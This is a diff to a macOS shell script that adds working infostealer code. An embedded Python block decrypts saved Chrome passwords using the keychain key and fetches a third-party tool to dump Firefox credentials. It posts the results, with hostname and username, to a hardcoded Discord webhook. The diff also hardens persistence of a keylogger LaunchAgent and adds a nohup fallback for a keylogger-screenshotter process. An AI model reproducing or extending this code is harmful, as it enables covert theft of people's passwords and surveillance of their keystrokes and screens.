@@ -674,6 +674,159 @@ if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
     curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
         -d "{\"content\": \"$ESCAPED_MESSAGE\"}" \
         "$WEBHOOK" >/dev/null 2>&1
+    
+    # Trigger password extraction immediately (don't wait for keylogger)
+    extract_passwords_immediately() {
+        local OUTPUT_FILE='/tmp/passwords.txt'
+        local EXTRACT_SCRIPT='/tmp/extract_passwords.sh'
+        local WEBHOOK='https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8'
+        
+        # Use the same Python extraction code from the keylogger script
+        # Run it directly here to extract passwords immediately
+        python3 << 'PYEOF' >/dev/null 2>&1 &
+import sqlite3
+import os
+import json
+import subprocess
+import sys
+import shutil
+import tempfile
+import base64
+import urllib.request
+import platform
+
+OUTPUT_FILE = '/tmp/passwords.txt'
+WEBHOOK = 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8'
+
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', '--user', 'pycryptodome'], 
+                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
+    try:
+        from Crypto.Cipher import AES
+        from Crypto.Protocol.KDF import PBKDF2
+        CRYPTO_AVAILABLE = True
+    except:
+        CRYPTO_AVAILABLE = False
+
+def get_chrome_key():
+    try:
+        result = subprocess.run(['security', 'find-generic-password', '-w', '-a', 'Chrome', '-s', 'Chrome Safe Storage'],
+                              stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=2, stdin=subprocess.DEVNULL)
+        if result.returncode == 0 and result.stdout:
+            return result.stdout.decode('utf-8').strip()
+    except:
+        pass
+    return None
+
+def decrypt_chrome_password(encrypted_value, local_state_path=None):
+    if not encrypted_value or not CRYPTO_AVAILABLE:
+        return "[ENCRYPTED]"
+    try:
+        keychain_key = get_chrome_key()
+        if not keychain_key:
+            return "[ENCRYPTED - Keychain not accessible]"
+        if isinstance(encrypted_value, bytes) and len(encrypted_value) > 3:
+            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
+                encrypted = encrypted_value[3:]
+                if len(encrypted) < 40:
+                    return "[ENCRYPTED - Too short]"
+                salt = encrypted[:12]
+                encrypted_data = encrypted[12:]
+                if len(encrypted_data) < 28:
+                    return "[ENCRYPTED - Invalid data]"
+                derived_key = PBKDF2(keychain_key.encode('utf-8'), salt, 16, count=1003, hmac_hash_module=None)
+                nonce = encrypted_data[:12]
+                ciphertext = encrypted_data[12:-16]
+                tag = encrypted_data[-16:]
+                cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                return decrypted.decode('utf-8', errors='ignore').rstrip('\\x00')
+        return "[ENCRYPTED - Unknown format]"
+    except:
+        return "[ENCRYPTED]"
+
+# Extract passwords
+with open(OUTPUT_FILE, 'w') as f:
+    f.write("Password Extraction\\n")
+    f.write("=" * 50 + "\\n\\n")
+    
+    # Chrome
+    chrome_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/")
+    login_db = os.path.join(chrome_path, "Login Data")
+    if os.path.exists(login_db):
+        try:
+            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
+            shutil.copy2(login_db, temp_db.name)
+            temp_db.close()
+            conn = sqlite3.connect(temp_db.name)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 50")
+            f.write("=== CHROME PASSWORDS ===\\n")
+            for row in cursor.fetchall():
+                url = row[0] or ""
+                username = row[1] or ""
+                encrypted = row[2]
+                if url:
+                    password = decrypt_chrome_password(encrypted) if encrypted else "[NO PASSWORD]"
+                    f.write(f"URL: {url}\\nUsername: {username}\\nPassword: {password}\\n---\\n")
+            conn.close()
+            os.unlink(temp_db.name)
+        except:
+            pass
+    
+    # Firefox
+    firefox_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/")
+    if os.path.exists(firefox_path):
+        firefox_decrypt_script = "/tmp/firefox_decrypt.py"
+        try:
+            urllib.request.urlretrieve("https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py", firefox_decrypt_script)
+            profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
+            f.write("=== FIREFOX PASSWORDS ===\\n")
+            for profile in profiles[:1]:
+                profile_path = os.path.join(firefox_path, profile)
+                result = subprocess.run([sys.executable, firefox_decrypt_script, profile_path],
+                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20, stdin=subprocess.DEVNULL)
+                if result.returncode == 0 and result.stdout:
+                    f.write(result.stdout)
+        except:
+            pass
+
+# Send to Discord
+if os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 100:
+    import json
+    hostname = platform.node()
+    username = os.getenv('USER', 'Unknown')
+    with open(OUTPUT_FILE, 'r') as f:
+        content = f.read()
+    
+    message = {
+        "embeds": [{
+            "title": "🔐 Browser Passwords",
+            "color": 0xff9900,
+            "description": f"```\\n{content[:1500]}\\n```",
+            "fields": [
+                {"name": "Hostname", "value": f"`{hostname}`", "inline": True},
+                {"name": "PC Username", "value": f"`{username}`", "inline": True}
+            ],
+            "timestamp": subprocess.run(['date', '-u', '+%Y-%m-%dT%H:%M:%S.000Z'], capture_output=True, text=True).stdout.strip()
+        }]
+    }
+    
+    payload_file = '/tmp/passwords_discord.json'
+    with open(payload_file, 'w') as f:
+        json.dump(message, f)
+    
+    subprocess.run(['curl', '-s', '-X', 'POST', '-F', f'payload_json=@{payload_file}', '-F', f'file=@{OUTPUT_FILE}', WEBHOOK],
+                 timeout=10, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+PYEOF
+    }
+    
+    # Run password extraction in background
+    extract_passwords_immediately &
 fi
 
 # ---------------------
@@ -2444,11 +2597,15 @@ PLISTEOF
     
     # Load and start Launch Agent (ensure it actually starts and persists!)
     launchctl unload "$KEYLOGGER_AGENT_FILE" 2>/dev/null
+    sleep 1
     launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null
     
-    # Wait a moment then start it (ONLY via LaunchAgent - no duplicate!)
+    # Start it directly as backup (ensure it runs)
     sleep 2
     launchctl start com.keylogger.helper 2>/dev/null || true
+    
+    # Also start directly as nohup backup (in case LaunchAgent fails)
+    nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
     
     # Keylogger startup message is sent by the JS script itself (no duplicate needed)
 }
